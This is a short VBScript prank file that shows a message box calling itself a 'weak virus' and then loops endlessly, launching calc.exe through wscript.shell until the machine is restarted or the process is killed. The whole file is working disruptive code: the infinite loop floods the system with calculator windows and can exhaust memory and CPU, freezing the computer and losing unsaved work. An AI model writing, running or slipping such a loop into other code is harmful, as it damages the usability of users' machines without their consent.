msgbox "You Have Opened A Weak Virus Which Will Spam Tons Of Calculators. Stop it by restarting or Task Manager."
do
Set shell=CreateObject("wscript.shell")
Shell.Run("calc.exe")
loop